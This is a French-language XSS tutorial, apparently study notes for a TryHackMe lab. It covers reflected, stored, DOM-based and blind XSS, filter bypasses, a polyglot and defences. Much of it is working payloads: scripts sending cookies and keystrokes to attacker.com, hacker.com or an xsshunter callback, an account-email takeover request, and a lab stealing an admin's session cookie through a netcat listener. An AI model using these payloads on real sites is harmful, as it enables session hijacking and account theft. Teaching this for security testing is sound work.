# XSS
## 🔍 1. Qu’est-ce que le Cross-Site Scripting (XSS) ?

### Définition formelle
> **XSS** est une vulnérabilité de sécurité web qui permet à un attaquant d’injecter du code JavaScript malveillant dans une page web consultée par d’autres utilisateurs. Ce code s’exécute dans le contexte de la session de la victime, ce qui lui permet de voler des cookies, effectuer des actions au nom de l’utilisateur, ou même rediriger vers des sites malveillants.

### Analogie simple
Imaginez que vous écrivez un message sur un forum public. Si le site n’assainit pas votre message, vous pouvez y glisser un « mot magique » (du JavaScript) qui, lorsqu’un autre utilisateur lit votre message, exécute automatiquement une action sur **son** ordinateur — comme envoyer ses identifiants à un serveur pirate.

### Pourquoi c’est grave ?
- Le navigateur **fait confiance** au site → il exécute tout JavaScript provenant de ce site.
- Le JavaScript a accès à :
  - `document.cookie` (sessions, tokens)
  - `localStorage`, `sessionStorage`
  - Toute interaction DOM (clavier, clics, formulaires)
  - Appels réseau via `fetch()`, `XMLHttpRequest`

---

## 🧠 2. Les 4 types principaux d’XSS

### A. Reflected XSS (XSS réfléchi)

#### ⚙️ Fonctionnement
- Le payload est **envoyé dans la requête HTTP** (ex: URL, paramètre GET).
- Le serveur **réfléchit** ce payload **directement dans la réponse HTML**, sans validation.
- L’attaque nécessite que la victime **clique sur un lien piégé**.

#### 📌 Exemple concret
URL malveillante :
```
https://vuln-site.com/search?q=<script>alert('XSS')</script>
```

Si le site affiche :
```html
<p>Vous avez cherché : <script>alert('XSS')</script></p>
```
→ Le script s’exécute dans le navigateur de la victime.

#### 🎯 Impact
- Vol de session via lien envoyé par email / chat
- Phishing avancé
- Redirection vers malware

#### 🔍 Test
- Injecter `<script>alert(1)</script>` dans tous les champs de formulaire, paramètres d’URL, headers (`User-Agent`, `Referer`…)
- Vérifier si le payload est **réfléchi sans encodage**

---

### B. Stored XSS (XSS persistant)

#### ⚙️ Fonctionnement
- Le payload est **stocké côté serveur** (base de données, commentaires, profils…)
- Il est **servi à tous les utilisateurs** qui chargent la page concernée.

#### 📌 Exemple concret
Sur un blog :
```html
<!-- Commentaire posté par l'attaquant -->
<div class="comment">
  <p>Super article !</p>
  <script>fetch('https://hacker.com/steal?c='+btoa(document.cookie))</script>
</div>
```

Chaque visiteur exécute ce script → envoie ses cookies à l’attaquant.

#### 🎯 Impact
- **Automatique** : pas besoin de cliquer sur un lien
- Peut compromettre **des milliers d’utilisateurs**
- Souvent plus critique que Reflected XSS

#### 🔍 Test
- Tester les zones de saisie **persistantes** :
  - Commentaires
  - Noms d’utilisateur
  - Bio, descriptions
  - Uploads de fichiers (si contenu HTML affiché)

---

### C. DOM-based XSS

#### ⚙️ Fonctionnement
- **Aucune interaction serveur** : le payload est traité **uniquement côté client**.
- Le JavaScript de la page lit une source non fiable (ex: `location.hash`, `document.URL`) et l’insère dans le DOM **sans sanitization**.

#### 📌 Exemple concret
Page JavaScript :
```js
// Vulnérable !
var name = window.location.hash.substring(1);
document.getElementById("welcome").innerHTML = "Bonjour " + name;
```

URL malveillante :
```
https://site.com/#<img src=x onerror=alert('XSS')>
```

→ Le DOM insère directement le HTML → exécution.

#### 🎯 Particularité
- Le serveur **ne voit jamais le payload** → invisible aux WAF classiques
- Requiert **analyse du code JS client**

#### 🔍 Test
- Chercher dans le code source :
  - `location.search`, `location.hash`, `document.URL`
  - `innerHTML`, `outerHTML`, `document.write()`, `eval()`
- Utiliser des outils comme **DOM Invader** (Burp Suite) ou **manual review**

---

### D. Blind XSS

#### ⚙️ Fonctionnement
- Sous-type de **Stored XSS**, mais **vous ne voyez pas l’exécution**.
- Le payload est stocké, puis exécuté dans un **environnement privé** (ex: interface admin, support ticket).

#### 📌 Exemple concret
Formulaire de contact :
```html
<textarea name="message">...</textarea>
```

Payload :
```html
<script>
  fetch('https://xsshunter.com/your-id?data=' + btoa(document.cookie + ' | ' + location.href));
</script>
```

→ Un admin consulte le ticket → payload s’exécute → vous recevez les données.

#### 🎯 Outils clés
- **XSS Hunter** (https://xsshunter.com) : plateforme gratuite pour détecter Blind XSS
- **Burp Collaborator** (Pro)
- Serveur maison avec `nc` ou `python3 -m http.server`

#### 🔍 Test
- Toujours inclure un **callback réseau** dans vos payloads :
  ```js
  new Image().src = "https://attacker.com/log?data=" + encodeURIComponent(document.cookie);
  ```

---

## 💣 3. Les intentions des payloads XSS

Un payload = **intention + adaptation au contexte**

### A. Proof of Concept (PoC)
Objectif : prouver l’existence de la vulnérabilité.

```html
<script>alert('XSS')</script>
```

> ✅ Simple, universel, non destructif.

---

### B. Vol de session (Session Stealing)
Objectif : récupérer les cookies de session.

```html
<script>
  fetch('https://attacker.com/steal?c=' + btoa(document.cookie));
</script>
```

> ⚠️ Ne fonctionne que si les cookies **ne sont pas marqués `HttpOnly`**.

Alternative avec `Image` (fonctionne même si `fetch` bloqué) :
```js
new Image().src = "https://attacker.com/steal?c=" + document.cookie;
```

---

### C. Keylogger
Objectif : capturer chaque touche tapée.

```js
<script>
document.onkeypress = function(e) {
  fetch('https://attacker.com/log?key=' + btoa(e.key));
};
</script>
```

> ⚠️ Très intrusif, souvent détecté par les antivirus.

---

### D. Business Logic Abuse
Objectif : modifier l’état de l’application.

Exemple : changement d’email admin
```js
<script>
  // Si une fonction globale existe
  if (typeof user !== 'undefined' && user.changeEmail) {
    user.changeEmail('hacker@evil.com');
  }
</script>
```

Ou via requête directe :
```js
fetch('/api/user/email', {
  method: 'POST',
  credentials: 'include',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({email: 'hacker@evil.com'})
});
```

→ Permet ensuite un **reset de mot de passe**.

---

## 🛠️ 4. Construction & Adaptation des Payloads

Le contexte détermine **comment** injecter le JS.

### Contexte 1 : HTML normal
```html
<div>Bonjour [INPUT]</div>
```
→ Payload : `<script>alert(1)</script>`

---

### Contexte 2 : Attribut HTML (ex: `<input value="[INPUT]">`)
```html
<input value="Alexis">
```
→ Vous êtes **dans une chaîne de caractères** → fermer l’attribut ET la balise :
```html
"><script>alert(1)</script>
```

Résultat :
```html
<input value=""><script>alert(1)</script>">
```

---

### Contexte 3 : Balise `<textarea>`
```html
<textarea>Alexis</textarea>
```
→ Fermer la balise :
```html
</textarea><script>alert(1)</script>
```

---

### Contexte 4 : JavaScript inline
```html
<script>
  var name = "Alexis";
</script>
```
→ Fermer la chaîne + ajouter du code :
```js
";alert(1);//
```

Résultat :
```js
var name = "";alert(1);//";
```

---

### Contexte 5 : Filtres basiques (ex: suppression de `<script>`)
Filtre naïf :
```python
input = input.replace("<script>", "")
```

→ Contournement par **doublage** :
```html
<scr<script>ipt>alert(1)</scr<script>ipt>
```
Après suppression : `<script>alert(1)</script>`

---

### Contexte 6 : Filtrage de `<` et `>`
Impossible d’utiliser `<script>` → utiliser **événements HTML** :
```html
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
```

Ou attributs comme :
```html
<input autofocus onfocus=alert(1)>
```

---

## 🧬 5. Les Polyglottes XSS

Un **polyglotte** est un payload qui fonctionne dans **plusieurs contextes à la fois**.

### Exemple célèbre (adapté à THM) :
```text
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e
```

### Pourquoi ça marche ?
- Mélange de syntaxes : JS, HTML, commentaires, encodage
- Échappe :
  - Attributs (`onerror`)
  - Balises (`</script>`, `</textarea>`)
  - Contextes JS (`javascript:` URI)
- Contient des **bypass de filtres** (majuscules, commentaires, encodage)

> ✅ À utiliser quand vous ne savez pas dans quel contexte vous êtes.

---

## 🧪 6. Laboratoire Pratique : Exfiltration de Cookies (Blind XSS)

### Étape 1 : Mettre en place un serveur d’écoute
```bash
# Sur votre machine (AttackBox)
nc -nlvp 9001
```

### Étape 2 : Construire le payload
```html
</textarea>
<script>
  fetch('http://YOUR_IP:9001?cookie=' + btoa(document.cookie));
</script>
```

> Remplacez `YOUR_IP` par votre IP publique ou celle du VPN THM.

### Étape 3 : Injecter dans le formulaire de contact
Soumettre le payload → attendre qu’un admin le lise.

### Étape 4 : Récupérer les cookies
Dans `nc` :
```
GET /?cookie=abc123... HTTP/1.1
Host: YOUR_IP:9001
...
```

→ Décoder en base64 :
```bash
echo "abc123..." | base64 -d
```

→ Utiliser les cookies dans Burp ou avec `curl --cookie` pour **hijacker la session**.

---

## 🛡️ 7. Défenses contre XSS

### Côté développeur
1. **Échappement contextuel** :
   - HTML : `&lt;` au lieu de `<`
   - Attributs : encoder `"`, `'`, `<`, `>`
   - JS : utiliser `JSON.stringify()` pour les valeurs dynamiques
2. **Content Security Policy (CSP)** :
   ```http
   Content-Security-Policy: default-src 'self'; script-src 'self'
   ```
   → Bloque l’exécution de scripts inline/non autorisés.
3. **Marquer les cookies comme `HttpOnly`** → empêche `document.cookie`
4. **Utiliser des frameworks modernes** (React, Vue) → auto-escaping par défaut

### Côté pentester
- Toujours tester **tous les points d’entrée**
- Utiliser **Burp Suite + extensions** (XSS Validator, Logger++)
- Automatiser avec **dalfox**, **xsstrike**
- Ne jamais se limiter à `<script>alert(1)</script>`

---

## 📚 Résumé Visuel

| Type          | Stockage | Interaction | Callback nécessaire ? |
|---------------|----------|-------------|------------------------|
| Reflected     | Non      | Oui (lien)  | Non                    |
| Stored        | Oui      | Non         | Non (mais utile)       |
| DOM-based     | Non      | Oui/Non     | Parfois                |
| Blind         | Oui      | Non         | **Oui**                |

---
